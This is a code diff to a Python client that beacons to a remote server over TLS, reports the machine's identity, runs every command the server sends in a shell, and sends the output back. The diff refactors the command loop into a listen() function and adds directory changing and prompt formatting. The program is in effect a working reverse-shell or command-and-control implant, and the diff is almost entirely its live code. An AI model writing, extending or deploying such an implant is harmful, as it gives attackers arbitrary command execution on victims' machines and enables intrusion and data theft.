@@ -9,6 +9,7 @@ import getpass
 import secrets
 import string
 import subprocess
+from os import chdir, getcwd, getlogin, path
 
 from pathlib import Path
 from time import sleep
@@ -41,6 +42,17 @@ def get_info():
         "machine_id": Path("/etc/machine-id").read_text().strip(),
     }
 
+def get_prompt() -> str:
+    username = getlogin()
+    hostname = socket.gethostname()
+    cwd = getcwd()
+
+    # shorten home dir to ~
+    home = path.expanduser("~")
+    if cwd.startswith(home):
+        cwd = "~" + cwd[len(home):]
+
+    return f"{username}@{hostname}:{cwd} >$ "
 
 def ping():
     url = f"{args.proto}://{args.host}:{args.port}/ping"
@@ -87,50 +99,46 @@ def communicate(port: int):
                 tls.sendall(
                     (json.dumps(get_info())).encode("utf-8")
                 )
-
-                while True:
-                    try:
-                        data = tls.recv(4096)
-
-                        if not data:
-                            print("Server disconnected cleanly")
-                            break
-
-                        cmdlet = data.decode("utf-8").strip()
-                        if cmdlet == "exit":
-                            print("[*] Server requested disconnect")
-                            return
-
-                        print(f"[SERVER] {cmdlet}")
-
-                        result = subprocess.run(
-                            cmdlet,
-                            shell=True,
-                            capture_output=True,
-                            text=True
-                        )
-
-                        username = getpass.getuser()
-                        hostname = socket.gethostname()
-                        cwd = Path.cwd()
-                        prompt = f"{username}@{hostname}:{cwd}$ " + cmdlet + "\n"
-                        output = prompt + result.stdout + result.stderr
-                        tls.sendall(output.encode())
-
-                    except ConnectionResetError:
-                        print("Connection reset")
-                        continue
-                    except TimeoutError as e:
-                        print(e)
-                        continue
-                    except ssl.SSLError as e:
-                        print(e)
-                        return
-
+                print("[+] Listening")
+                listen(tls)
         except Exception as e:
             print(f"[TLS] {e}")
             print("[*] Retrying in 2 seconds...")
             sleep(2)
+
+def listen(tls: ssl.SSLSocket):
+    while True:
+        try:
+            data = tls.recv(4096)
+
+            if not data:
+                print("Server disconnected")
+                break
+
+            cmdlet = data.decode("utf-8").strip()
+            if cmdlet == "exit":
+                print("[*] Disconnect by remote host")
+                return
+            print(f"[SERVER] {cmdlet}")
+            
+            output = get_prompt() + cmdlet + "\n"
+
+            cmd_split = cmdlet.split(" ")
+            if cmd_split[0] == "cd":
+                chdir(cmd_split[1])
+                tls.sendall(output.encode())
+            else:
+                output += subprocess.getoutput(cmdlet)
+                tls.sendall(output.encode())
+        except ConnectionResetError:
+            print("Connection reset")
+            return
+        except TimeoutError as e:
+            print(e)
+            continue
+        except ssl.SSLError as e:
+            print(e)
+            return
 
 def main():
     ping()
